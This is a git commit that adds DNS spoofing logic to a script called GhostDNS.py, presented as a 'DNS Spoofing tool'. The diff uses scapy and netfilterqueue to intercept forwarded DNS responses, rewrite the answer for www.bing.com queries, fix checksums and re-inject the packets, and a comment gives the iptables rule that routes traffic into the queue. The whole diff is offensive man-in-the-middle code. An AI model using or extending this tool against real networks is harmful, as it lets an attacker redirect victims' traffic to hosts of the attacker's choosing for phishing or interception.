a08a8ae887522d7cdb12339a961ecf94edf5b82f
Shivam Singh <dreamyshivam01@gmail.com>
2025-02-11 23:42:46 +0530

    GhostDNS - DNS Spoofing tool Powered By ANOTNET

--- GhostDNS.py
+++ GhostDNS.py
@@ -3,7 +3,19 @@ import scapy.all as scapy
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in qname:
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum  
+            packet.set_payload(str(scapy_packet))
+    
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue() 
@@ -11,3 +23,5 @@ queue.bind(0, process_packet)
 queue.run()
 
 
+#  IPtables commands to redirect the DNS traffic to the queue:
+#  Iptables -I FORWARD -j NFQUEUE --queue-num 0
